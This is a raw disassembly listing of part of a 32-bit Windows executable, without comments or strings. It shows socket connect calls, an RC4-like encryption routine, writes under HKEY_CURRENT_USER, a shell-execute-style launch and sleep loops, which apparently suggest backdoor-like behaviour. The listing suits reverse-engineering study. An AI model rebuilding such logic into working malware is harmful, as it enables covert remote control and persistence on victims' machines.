  4025cd:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4025d0:	8b f0                	mov    %eax,%esi
  4025d2:	ff 15 54 02 41 00    	call   *0x410254
  4025d8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4025db:	ff 15 54 02 41 00    	call   *0x410254
  4025e1:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025e4:	ff 15 54 02 41 00    	call   *0x410254
  4025ea:	8b c6                	mov    %esi,%eax
  4025ec:	5e                   	pop    %esi
  4025ed:	c9                   	leave
  4025ee:	c3                   	ret
  4025ef:	55                   	push   %ebp
  4025f0:	8b ec                	mov    %esp,%ebp
  4025f2:	56                   	push   %esi
  4025f3:	6a 06                	push   $0x6
  4025f5:	6a 01                	push   $0x1
  4025f7:	6a 00                	push   $0x0
  4025f9:	e8 28 d9 00 00       	call   0x40ff26
  4025fe:	8b f0                	mov    %eax,%esi
  402600:	6a 10                	push   $0x10
  402602:	68 78 52 41 00       	push   $0x415278
  402607:	56                   	push   %esi
  402608:	e8 2b d9 00 00       	call   0x40ff38
  40260d:	85 c0                	test   %eax,%eax
  40260f:	75 1e                	jne    0x40262f
  402611:	56                   	push   %esi
  402612:	8d 45 08             	lea    0x8(%ebp),%eax
  402615:	83 ec 10             	sub    $0x10,%esp
  402618:	8b cc                	mov    %esp,%ecx
  40261a:	50                   	push   %eax
  40261b:	ff 15 60 02 41 00    	call   *0x410260
  402621:	e8 de fe ff ff       	call   0x402504
  402626:	83 c4 14             	add    $0x14,%esp
  402629:	80 7d 18 00          	cmpb   $0x0,0x18(%ebp)
  40262d:	74 09                	je     0x402638
  40262f:	56                   	push   %esi
  402630:	e8 eb d8 00 00       	call   0x40ff20
  402635:	83 ce ff             	or     $0xffffffff,%esi
  402638:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40263b:	ff 15 54 02 41 00    	call   *0x410254
  402641:	8b c6                	mov    %esi,%eax
  402643:	5e                   	pop    %esi
  402644:	5d                   	pop    %ebp
  402645:	c3                   	ret
  402646:	55                   	push   %ebp
  402647:	8b ec                	mov    %esp,%ebp
  402649:	83 ec 30             	sub    $0x30,%esp
  40264c:	53                   	push   %ebx
  40264d:	56                   	push   %esi
  40264e:	8b f1                	mov    %ecx,%esi
  402650:	33 db                	xor    %ebx,%ebx
  402652:	38 5e 34             	cmp    %bl,0x34(%esi)
  402655:	0f 85 8f 00 00 00    	jne    0x4026ea
  40265b:	38 1d 38 59 41 00    	cmp    %bl,0x415938
  402661:	57                   	push   %edi
  402662:	8b 7d 08             	mov    0x8(%ebp),%edi
  402665:	74 67                	je     0x4026ce
  402667:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40266a:	50                   	push   %eax
  40266b:	ff 15 78 01 41 00    	call   *0x410178
  402671:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  402675:	57                   	push   %edi
  402676:	50                   	push   %eax
  402677:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  40267b:	50                   	push   %eax
  40267c:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40267f:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  402683:	50                   	push   %eax
  402684:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  402688:	50                   	push   %eax
  402689:	8d 45 0b             	lea    0xb(%ebp),%eax
  40268c:	68 ac 06 41 00       	push   $0x4106ac
  402691:	50                   	push   %eax
  402692:	68 88 06 41 00       	push   $0x410688
  402697:	ff 15 4c 02 41 00    	call   *0x41024c
  40269d:	50                   	push   %eax
  40269e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4026a1:	50                   	push   %eax
  4026a2:	e8 79 d5 00 00       	call   0x40fc20
  4026a7:	83 c4 0c             	add    $0xc,%esp
  4026aa:	8b c8                	mov    %eax,%ecx
  4026ac:	ff 15 58 02 41 00    	call   *0x410258
  4026b2:	50                   	push   %eax
  4026b3:	ff 15 74 03 41 00    	call   *0x410374
  4026b9:	83 c4 18             	add    $0x18,%esp
  4026bc:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4026bf:	ff 15 54 02 41 00    	call   *0x410254
  4026c5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4026c8:	ff 15 54 02 41 00    	call   *0x410254
  4026ce:	53                   	push   %ebx
  4026cf:	53                   	push   %ebx
  4026d0:	56                   	push   %esi
  4026d1:	68 23 28 40 00       	push   $0x402823
  4026d6:	53                   	push   %ebx
  4026d7:	53                   	push   %ebx
  4026d8:	c6 46 34 01          	movb   $0x1,0x34(%esi)
  4026dc:	89 7e 38             	mov    %edi,0x38(%esi)
  4026df:	ff 15 98 01 41 00    	call   *0x410198
  4026e5:	b0 01                	mov    $0x1,%al
  4026e7:	5f                   	pop    %edi
  4026e8:	eb 02                	jmp    0x4026ec
  4026ea:	32 c0                	xor    %al,%al
  4026ec:	5e                   	pop    %esi
  4026ed:	5b                   	pop    %ebx
  4026ee:	c9                   	leave
  4026ef:	c2 04 00             	ret    $0x4
  4026f2:	55                   	push   %ebp
  4026f3:	8b ec                	mov    %esp,%ebp
  4026f5:	83 ec 30             	sub    $0x30,%esp
  4026f8:	56                   	push   %esi
  4026f9:	8b f1                	mov    %ecx,%esi
  4026fb:	80 7e 34 00          	cmpb   $0x0,0x34(%esi)
  4026ff:	0f 84 85 00 00 00    	je     0x40278a
  402705:	80 3d 38 59 41 00 00 	cmpb   $0x0,0x415938
  40270c:	57                   	push   %edi
  40270d:	8b 7d 08             	mov    0x8(%ebp),%edi
  402710:	74 6c                	je     0x40277e
  402712:	39 7e 38             	cmp    %edi,0x38(%esi)
  402715:	74 67                	je     0x40277e
  402717:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40271a:	50                   	push   %eax
  40271b:	ff 15 78 01 41 00    	call   *0x410178
  402721:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  402725:	57                   	push   %edi
  402726:	50                   	push   %eax
  402727:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  40272b:	50                   	push   %eax
  40272c:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40272f:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  402733:	50                   	push   %eax
  402734:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  402738:	50                   	push   %eax
  402739:	8d 45 0b             	lea    0xb(%ebp),%eax
  40273c:	68 cc 06 41 00       	push   $0x4106cc
  402741:	50                   	push   %eax
  402742:	68 88 06 41 00       	push   $0x410688
  402747:	ff 15 4c 02 41 00    	call   *0x41024c
  40274d:	50                   	push   %eax
  40274e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402751:	50                   	push   %eax
  402752:	e8 c9 d4 00 00       	call   0x40fc20
  402757:	83 c4 0c             	add    $0xc,%esp
  40275a:	8b c8                	mov    %eax,%ecx
  40275c:	ff 15 58 02 41 00    	call   *0x410258
  402762:	50                   	push   %eax
  402763:	ff 15 74 03 41 00    	call   *0x410374
  402769:	83 c4 18             	add    $0x18,%esp
  40276c:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40276f:	ff 15 54 02 41 00    	call   *0x410254
  402775:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  402778:	ff 15 54 02 41 00    	call   *0x410254
  40277e:	83 66 3c 00          	andl   $0x0,0x3c(%esi)
  402782:	89 7e 38             	mov    %edi,0x38(%esi)
  402785:	b0 01                	mov    $0x1,%al
  402787:	5f                   	pop    %edi
  402788:	eb 02                	jmp    0x40278c
  40278a:	32 c0                	xor    %al,%al
  40278c:	5e                   	pop    %esi
  40278d:	c9                   	leave
  40278e:	c2 04 00             	ret    $0x4
  402791:	55                   	push   %ebp
  402792:	8b ec                	mov    %esp,%ebp
  402794:	83 ec 30             	sub    $0x30,%esp
  402797:	56                   	push   %esi
  402798:	8b f1                	mov    %ecx,%esi
  40279a:	32 c0                	xor    %al,%al
  40279c:	38 46 34             	cmp    %al,0x34(%esi)
  40279f:	74 7b                	je     0x40281c
  4027a1:	38 05 38 59 41 00    	cmp    %al,0x415938
  4027a7:	74 6b                	je     0x402814
  4027a9:	38 45 08             	cmp    %al,0x8(%ebp)
  4027ac:	75 66                	jne    0x402814
  4027ae:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4027b1:	50                   	push   %eax
  4027b2:	ff 15 78 01 41 00    	call   *0x410178
  4027b8:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  4027bc:	50                   	push   %eax
  4027bd:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4027c0:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  4027c4:	50                   	push   %eax
  4027c5:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  4027c9:	50                   	push   %eax
  4027ca:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  4027ce:	50                   	push   %eax
  4027cf:	8d 45 0b             	lea    0xb(%ebp),%eax
  4027d2:	68 e4 06 41 00       	push   $0x4106e4
  4027d7:	50                   	push   %eax
  4027d8:	68 88 06 41 00       	push   $0x410688
  4027dd:	ff 15 4c 02 41 00    	call   *0x41024c
  4027e3:	50                   	push   %eax
  4027e4:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4027e7:	50                   	push   %eax
  4027e8:	e8 33 d4 00 00       	call   0x40fc20
  4027ed:	83 c4 0c             	add    $0xc,%esp
  4027f0:	8b c8                	mov    %eax,%ecx
  4027f2:	ff 15 58 02 41 00    	call   *0x410258
  4027f8:	50                   	push   %eax
  4027f9:	ff 15 74 03 41 00    	call   *0x410374
  4027ff:	83 c4 14             	add    $0x14,%esp
  402802:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402805:	ff 15 54 02 41 00    	call   *0x410254
  40280b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40280e:	ff 15 54 02 41 00    	call   *0x410254
  402814:	c6 46 35 01          	movb   $0x1,0x35(%esi)
  402818:	b0 01                	mov    $0x1,%al
  40281a:	eb 02                	jmp    0x40281e
  40281c:	32 c0                	xor    %al,%al
  40281e:	5e                   	pop    %esi
  40281f:	c9                   	leave
  402820:	c2 04 00             	ret    $0x4
  402823:	55                   	push   %ebp
  402824:	8b ec                	mov    %esp,%ebp
  402826:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402829:	e8 04 00 00 00       	call   0x402832
  40282e:	5d                   	pop    %ebp
  40282f:	c2 04 00             	ret    $0x4
  402832:	55                   	push   %ebp
  402833:	8b ec                	mov    %esp,%ebp
  402835:	83 ec 34             	sub    $0x34,%esp
  402838:	53                   	push   %ebx
  402839:	56                   	push   %esi
  40283a:	8b f1                	mov    %ecx,%esi
  40283c:	33 db                	xor    %ebx,%ebx
  40283e:	39 5e 38             	cmp    %ebx,0x38(%esi)
  402841:	89 5e 3c             	mov    %ebx,0x3c(%esi)
  402844:	76 1f                	jbe    0x402865
  402846:	38 5e 35             	cmp    %bl,0x35(%esi)
  402849:	0f 85 90 00 00 00    	jne    0x4028df
  40284f:	68 e8 03 00 00       	push   $0x3e8
  402854:	ff 15 8c 01 41 00    	call   *0x41018c
  40285a:	ff 46 3c             	incl   0x3c(%esi)
  40285d:	8b 46 3c             	mov    0x3c(%esi),%eax
  402860:	3b 46 38             	cmp    0x38(%esi),%eax
  402863:	72 e1                	jb     0x402846
  402865:	38 5e 35             	cmp    %bl,0x35(%esi)
  402868:	75 75                	jne    0x4028df
  40286a:	38 1d 38 59 41 00    	cmp    %bl,0x415938
  402870:	74 66                	je     0x4028d8
  402872:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402875:	50                   	push   %eax
  402876:	ff 15 78 01 41 00    	call   *0x410178
  40287c:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  402880:	50                   	push   %eax
  402881:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  402884:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  402888:	50                   	push   %eax
  402889:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
  40288d:	50                   	push   %eax
  40288e:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
  402892:	50                   	push   %eax
  402893:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402896:	68 f0 06 41 00       	push   $0x4106f0
  40289b:	50                   	push   %eax
  40289c:	68 88 06 41 00       	push   $0x410688
  4028a1:	ff 15 4c 02 41 00    	call   *0x41024c
  4028a7:	50                   	push   %eax
  4028a8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4028ab:	50                   	push   %eax
  4028ac:	e8 6f d3 00 00       	call   0x40fc20
  4028b1:	83 c4 0c             	add    $0xc,%esp
  4028b4:	8b c8                	mov    %eax,%ecx
  4028b6:	ff 15 58 02 41 00    	call   *0x410258
  4028bc:	50                   	push   %eax
  4028bd:	ff 15 74 03 41 00    	call   *0x410374
  4028c3:	83 c4 14             	add    $0x14,%esp
  4028c6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4028c9:	ff 15 54 02 41 00    	call   *0x410254
  4028cf:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4028d2:	ff 15 54 02 41 00    	call   *0x410254
  4028d8:	8b ce                	mov    %esi,%ecx
  4028da:	e8 e8 f8 ff ff       	call   0x4021c7
  4028df:	88 5e 34             	mov    %bl,0x34(%esi)
  4028e2:	88 5e 35             	mov    %bl,0x35(%esi)
  4028e5:	5e                   	pop    %esi
  4028e6:	33 c0                	xor    %eax,%eax
  4028e8:	5b                   	pop    %ebx
  4028e9:	c9                   	leave
  4028ea:	c3                   	ret
  4028eb:	55                   	push   %ebp
  4028ec:	8b ec                	mov    %esp,%ebp
  4028ee:	56                   	push   %esi
  4028ef:	8b f1                	mov    %ecx,%esi
  4028f1:	ff 75 0c             	push   0xc(%ebp)
  4028f4:	ff 75 08             	push   0x8(%ebp)
  4028f7:	e8 0a 00 00 00       	call   0x402906
  4028fc:	8b c6                	mov    %esi,%eax
  4028fe:	5e                   	pop    %esi
  4028ff:	5d                   	pop    %ebp
  402900:	c2 08 00             	ret    $0x8
  402903:	8b c1                	mov    %ecx,%eax
  402905:	c3                   	ret
  402906:	55                   	push   %ebp
  402907:	8b ec                	mov    %esp,%ebp
  402909:	53                   	push   %ebx
  40290a:	56                   	push   %esi
  40290b:	8d 81 00 04 00 00    	lea    0x400(%ecx),%eax
  402911:	33 f6                	xor    %esi,%esi
  402913:	57                   	push   %edi
  402914:	89 b1 04 04 00 00    	mov    %esi,0x404(%ecx)
  40291a:	89 30                	mov    %esi,(%eax)
  40291c:	bf 00 01 00 00       	mov    $0x100,%edi
  402921:	8b 10                	mov    (%eax),%edx
  402923:	89 14 91             	mov    %edx,(%ecx,%edx,4)
  402926:	ff 00                	incl   (%eax)
  402928:	39 38                	cmp    %edi,(%eax)
  40292a:	7c f5                	jl     0x402921
  40292c:	89 b1 00 04 00 00    	mov    %esi,0x400(%ecx)
  402932:	8b 81 00 04 00 00    	mov    0x400(%ecx),%eax
  402938:	33 d2                	xor    %edx,%edx
  40293a:	8b df                	mov    %edi,%ebx
  40293c:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  40293f:	f7 75 0c             	divl   0xc(%ebp)
  402942:	8b 45 08             	mov    0x8(%ebp),%eax
  402945:	0f b6 04 02          	movzbl (%edx,%eax,1),%eax
  402949:	03 06                	add    (%esi),%eax
  40294b:	03 81 04 04 00 00    	add    0x404(%ecx),%eax
  402951:	99                   	cltd
  402952:	f7 fb                	idiv   %ebx
  402954:	89 91 04 04 00 00    	mov    %edx,0x404(%ecx)
  40295a:	8a 06                	mov    (%esi),%al
  40295c:	88 81 08 04 00 00    	mov    %al,0x408(%ecx)
  402962:	8b c2                	mov    %edx,%eax
  402964:	8b 04 81             	mov    (%ecx,%eax,4),%eax
  402967:	89 06                	mov    %eax,(%esi)
  402969:	8b 91 04 04 00 00    	mov    0x404(%ecx),%edx
  40296f:	0f b6 81 08 04 00 00 	movzbl 0x408(%ecx),%eax
  402976:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  402979:	ff 81 00 04 00 00    	incl   0x400(%ecx)
  40297f:	39 b9 00 04 00 00    	cmp    %edi,0x400(%ecx)
  402985:	7c ab                	jl     0x402932
  402987:	5f                   	pop    %edi
  402988:	5e                   	pop    %esi
  402989:	5b                   	pop    %ebx
  40298a:	5d                   	pop    %ebp
  40298b:	c2 08 00             	ret    $0x8
  40298e:	55                   	push   %ebp
  40298f:	8b ec                	mov    %esp,%ebp
  402991:	81 ec 0c 04 00 00    	sub    $0x40c,%esp
  402997:	53                   	push   %ebx
  402998:	56                   	push   %esi
  402999:	8b f1                	mov    %ecx,%esi
  40299b:	bb 00 01 00 00       	mov    $0x100,%ebx
  4029a0:	57                   	push   %edi
  4029a1:	8b cb                	mov    %ebx,%ecx
  4029a3:	8d bd f4 fb ff ff    	lea    -0x40c(%ebp),%edi
  4029a9:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4029ac:	33 c0                	xor    %eax,%eax
  4029ae:	ff 45 0c             	incl   0xc(%ebp)
  4029b1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4029b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4029b6:	8b f8                	mov    %eax,%edi
  4029b8:	74 69                	je     0x402a23
  4029ba:	eb 03                	jmp    0x4029bf
  4029bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4029bf:	40                   	inc    %eax
  4029c0:	8b cb                	mov    %ebx,%ecx
  4029c2:	99                   	cltd
  4029c3:	f7 f9                	idiv   %ecx
  4029c5:	8b 84 95 f4 fb ff ff 	mov    -0x40c(%ebp,%edx,4),%eax
  4029cc:	8b f3                	mov    %ebx,%esi
  4029ce:	03 45 fc             	add    -0x4(%ebp),%eax
  4029d1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4029d4:	8d 8c 95 f4 fb ff ff 	lea    -0x40c(%ebp,%edx,4),%ecx
  4029db:	99                   	cltd
  4029dc:	f7 fe                	idiv   %esi
  4029de:	8b 75 f4             	mov    -0xc(%ebp),%esi
  4029e1:	8a 01                	mov    (%ecx),%al
  4029e3:	88 86 08 04 00 00    	mov    %al,0x408(%esi)
  4029e9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4029ec:	8d 84 95 f4 fb ff ff 	lea    -0x40c(%ebp,%edx,4),%eax
  4029f3:	8b 94 95 f4 fb ff ff 	mov    -0x40c(%ebp,%edx,4),%edx
  4029fa:	89 11                	mov    %edx,(%ecx)
  4029fc:	0f b6 96 08 04 00 00 	movzbl 0x408(%esi),%edx
  402a03:	89 10                	mov    %edx,(%eax)
  402a05:	8b 45 08             	mov    0x8(%ebp),%eax
  402a08:	8d 34 07             	lea    (%edi,%eax,1),%esi
  402a0b:	8b 01                	mov    (%ecx),%eax
  402a0d:	03 c2                	add    %edx,%eax
  402a0f:	8b cb                	mov    %ebx,%ecx
  402a11:	99                   	cltd
  402a12:	f7 f9                	idiv   %ecx
  402a14:	8a 84 95 f4 fb ff ff 	mov    -0x40c(%ebp,%edx,4),%al
  402a1b:	30 06                	xor    %al,(%esi)
  402a1d:	47                   	inc    %edi
  402a1e:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  402a21:	72 99                	jb     0x4029bc
  402a23:	5f                   	pop    %edi
  402a24:	5e                   	pop    %esi
  402a25:	5b                   	pop    %ebx
  402a26:	c9                   	leave
  402a27:	c2 08 00             	ret    $0x8
  402a2a:	55                   	push   %ebp
  402a2b:	8b ec                	mov    %esp,%ebp
  402a2d:	83 ec 10             	sub    $0x10,%esp
  402a30:	8d 45 0f             	lea    0xf(%ebp),%eax
  402a33:	56                   	push   %esi
  402a34:	50                   	push   %eax
  402a35:	8b f1                	mov    %ecx,%esi
  402a37:	ff 75 10             	push   0x10(%ebp)
  402a3a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402a3d:	ff 75 0c             	push   0xc(%ebp)
  402a40:	ff 15 70 02 41 00    	call   *0x410270
  402a46:	ff 75 10             	push   0x10(%ebp)
  402a49:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402a4c:	ff 15 58 02 41 00    	call   *0x410258
  402a52:	50                   	push   %eax
  402a53:	8b ce                	mov    %esi,%ecx
  402a55:	e8 34 ff ff ff       	call   0x40298e
  402a5a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402a5d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402a60:	50                   	push   %eax
  402a61:	ff 15 60 02 41 00    	call   *0x410260
  402a67:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402a6a:	ff 15 54 02 41 00    	call   *0x410254
  402a70:	8b 45 08             	mov    0x8(%ebp),%eax
  402a73:	5e                   	pop    %esi
  402a74:	c9                   	leave
  402a75:	c2 0c 00             	ret    $0xc
  402a78:	55                   	push   %ebp
  402a79:	8b ec                	mov    %esp,%ebp
  402a7b:	83 ec 24             	sub    $0x24,%esp
  402a7e:	56                   	push   %esi
  402a7f:	be 68 06 41 00       	mov    $0x410668,%esi
  402a84:	57                   	push   %edi
  402a85:	56                   	push   %esi
  402a86:	68 64 07 41 00       	push   $0x410764
  402a8b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402a8e:	68 00 00 00 80       	push   $0x80000000
  402a93:	50                   	push   %eax
  402a94:	e8 58 64 00 00       	call   0x408ef1
  402a99:	bf 50 59 41 00       	mov    $0x415950,%edi
  402a9e:	83 c4 10             	add    $0x10,%esp
  402aa1:	8b cf                	mov    %edi,%ecx
  402aa3:	ff 15 a0 02 41 00    	call   *0x4102a0
  402aa9:	50                   	push   %eax
  402aaa:	8b cf                	mov    %edi,%ecx
  402aac:	ff 15 58 02 41 00    	call   *0x410258
  402ab2:	50                   	push   %eax
  402ab3:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402ab6:	ff 15 a0 02 41 00    	call   *0x4102a0
  402abc:	40                   	inc    %eax
  402abd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402ac0:	50                   	push   %eax
  402ac1:	ff 15 58 02 41 00    	call   *0x410258
  402ac7:	50                   	push   %eax
  402ac8:	68 5c 07 41 00       	push   $0x41075c
  402acd:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  402ad2:	ff 15 58 02 41 00    	call   *0x410258
  402ad8:	bf 01 00 00 80       	mov    $0x80000001,%edi
  402add:	50                   	push   %eax
  402ade:	57                   	push   %edi
  402adf:	e8 ec 65 00 00       	call   0x4090d0
  402ae4:	83 c4 1c             	add    $0x1c,%esp
  402ae7:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402aea:	6a 02                	push   $0x2
  402aec:	83 ec 10             	sub    $0x10,%esp
  402aef:	8b cc                	mov    %esp,%ecx
  402af1:	50                   	push   %eax
  402af2:	68 0c 58 41 00       	push   $0x41580c
  402af7:	ff 15 4c 02 41 00    	call   *0x41024c
  402afd:	56                   	push   %esi
  402afe:	68 30 07 41 00       	push   $0x410730
  402b03:	57                   	push   %edi
  402b04:	e8 d1 64 00 00       	call   0x408fda
  402b09:	68 20 07 41 00       	push   $0x410720
  402b0e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402b11:	6a 34                	push   $0x34
  402b13:	50                   	push   %eax
  402b14:	e8 16 46 00 00       	call   0x40712f
  402b19:	83 c4 2c             	add    $0x2c,%esp
  402b1c:	33 ff                	xor    %edi,%edi
  402b1e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402b21:	57                   	push   %edi
  402b22:	56                   	push   %esi
  402b23:	56                   	push   %esi
  402b24:	ff 15 58 02 41 00    	call   *0x410258
  402b2a:	50                   	push   %eax
  402b2b:	68 18 07 41 00       	push   $0x410718
  402b30:	57                   	push   %edi
  402b31:	ff 15 bc 03 41 00    	call   *0x4103bc
  402b37:	83 f8 20             	cmp    $0x20,%eax
  402b3a:	76 07                	jbe    0x402b43
  402b3c:	57                   	push   %edi
  402b3d:	ff 15 ac 03 41 00    	call   *0x4103ac
  402b43:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402b46:	ff 15 54 02 41 00    	call   *0x410254
  402b4c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402b4f:	ff 15 54 02 41 00    	call   *0x410254
  402b55:	5f                   	pop    %edi
  402b56:	32 c0                	xor    %al,%al
  402b58:	5e                   	pop    %esi
  402b59:	c9                   	leave
  402b5a:	c3                   	ret
  402b5b:	55                   	push   %ebp
  402b5c:	8b ec                	mov    %esp,%ebp
  402b5e:	81 ec ec 03 00 00    	sub    $0x3ec,%esp
  402b64:	80 a5 14 fc ff ff 00 	andb   $0x0,-0x3ec(%ebp)
  402b6b:	53                   	push   %ebx
  402b6c:	56                   	push   %esi
  402b6d:	57                   	push   %edi
  402b6e:	b9 f9 00 00 00       	mov    $0xf9,%ecx
  402b73:	33 c0                	xor    %eax,%eax
  402b75:	8d bd 15 fc ff ff    	lea    -0x3eb(%ebp),%edi
  402b7b:	be 50 59 41 00       	mov    $0x415950,%esi
  402b80:	f3 ab                	rep stos %eax,%es:(%edi)
  402b82:	66 ab                	stos   %ax,%es:(%edi)
  402b84:	8b ce                	mov    %esi,%ecx
  402b86:	aa                   	stos   %al,%es:(%edi)
  402b87:	ff 15 a0 02 41 00    	call   *0x4102a0
  402b8d:	50                   	push   %eax
  402b8e:	8b ce                	mov    %esi,%ecx
  402b90:	ff 15 58 02 41 00    	call   *0x410258
  402b96:	50                   	push   %eax
  402b97:	8d 85 14 fc ff ff    	lea    -0x3ec(%ebp),%eax
  402b9d:	bb 5c 07 41 00       	mov    $0x41075c,%ebx
  402ba2:	bf e8 57 41 00       	mov    $0x4157e8,%edi
  402ba7:	50                   	push   %eax
  402ba8:	53                   	push   %ebx
  402ba9:	8b cf                	mov    %edi,%ecx
  402bab:	ff 15 58 02 41 00    	call   *0x410258
  402bb1:	be 01 00 00 80       	mov    $0x80000001,%esi
  402bb6:	50                   	push   %eax
  402bb7:	56                   	push   %esi
  402bb8:	e8 a7 63 00 00       	call   0x408f64
  402bbd:	83 c4 18             	add    $0x18,%esp
  402bc0:	84 c0                	test   %al,%al
  402bc2:	74 46                	je     0x402c0a
  402bc4:	6a 02                	push   $0x2
  402bc6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402bc9:	83 ec 10             	sub    $0x10,%esp
  402bcc:	8b cc                	mov    %esp,%ecx
  402bce:	50                   	push   %eax
  402bcf:	8d 85 14 fc ff ff    	lea    -0x3ec(%ebp),%eax
  402bd5:	50                   	push   %eax
  402bd6:	ff 15 4c 02 41 00    	call   *0x41024c
  402bdc:	68 68 06 41 00       	push   $0x410668
  402be1:	68 30 07 41 00       	push   $0x410730
  402be6:	56                   	push   %esi
  402be7:	e8 ee 63 00 00       	call   0x408fda
  402bec:	83 c4 20             	add    $0x20,%esp
  402bef:	8b cf                	mov    %edi,%ecx
  402bf1:	88 45 ff             	mov    %al,-0x1(%ebp)
  402bf4:	53                   	push   %ebx
  402bf5:	ff 15 58 02 41 00    	call   *0x410258
  402bfb:	50                   	push   %eax
  402bfc:	56                   	push   %esi
  402bfd:	e8 30 65 00 00       	call   0x409132
  402c02:	8a 45 ff             	mov    -0x1(%ebp),%al
  402c05:	83 c4 0c             	add    $0xc,%esp
  402c08:	eb 02                	jmp    0x402c0c
  402c0a:	32 c0                	xor    %al,%al
  402c0c:	5f                   	pop    %edi
  402c0d:	5e                   	pop    %esi
  402c0e:	5b                   	pop    %ebx
  402c0f:	c9                   	leave
  402c10:	c3                   	ret
  402c11:	e8 05 00 00 00       	call   0x402c1b
  402c16:	e9 14 00 00 00       	jmp    0x402c2f
  402c1b:	55                   	push   %ebp
  402c1c:	8b ec                	mov    %esp,%ebp
  402c1e:	51                   	push   %ecx
  402c1f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402c22:	b9 98 56 41 00       	mov    $0x415698,%ecx
  402c27:	50                   	push   %eax
  402c28:	e8 da 08 00 00       	call   0x403507
  402c2d:	c9                   	leave
  402c2e:	c3                   	ret
  402c2f:	68 3b 2c 40 00       	push   $0x402c3b
  402c34:	e8 81 d0 00 00       	call   0x40fcba
  402c39:	59                   	pop    %ecx
  402c3a:	c3                   	ret
  402c3b:	b9 98 56 41 00       	mov    $0x415698,%ecx
  402c40:	e9 dd 08 00 00       	jmp    0x403522
  402c45:	b8 ac ff 40 00       	mov    $0x40ffac,%eax
  402c4a:	e8 8f d0 00 00       	call   0x40fcde
  402c4f:	81 ec b4 03 00 00    	sub    $0x3b4,%esp
  402c55:	53                   	push   %ebx
  402c56:	56                   	push   %esi
  402c57:	57                   	push   %edi
  402c58:	89 65 f0             	mov    %esp,-0x10(%ebp)
  402c5b:	8b f9                	mov    %ecx,%edi
  402c5d:	8d 85 64 fd ff ff    	lea    -0x29c(%ebp),%eax
  402c63:	50                   	push   %eax
  402c64:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402c67:	ff 15 50 02 41 00    	call   *0x410250
  402c6d:	83 0f ff             	orl    $0xffffffff,(%edi)
  402c70:	33 f6                	xor    %esi,%esi
  402c72:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402c75:	6a 06                	push   $0x6
  402c77:	6a 01                	push   $0x1
  402c79:	56                   	push   %esi
  402c7a:	e8 a7 d2 00 00       	call   0x40ff26
  402c7f:	89 07                	mov    %eax,(%edi)
  402c81:	6a 10                	push   $0x10
  402c83:	68 78 52 41 00       	push   $0x415278
  402c88:	50                   	push   %eax
  402c89:	e8 aa d2 00 00       	call   0x40ff38
  402c8e:	85 c0                	test   %eax,%eax
  402c90:	0f 85 b7 04 00 00    	jne    0x40314d
  402c96:	ff 37                	push   (%edi)
  402c98:	83 ec 10             	sub    $0x10,%esp
  402c9b:	8b dc                	mov    %esp,%ebx
  402c9d:	8d 45 38             	lea    0x38(%ebp),%eax
  402ca0:	50                   	push   %eax
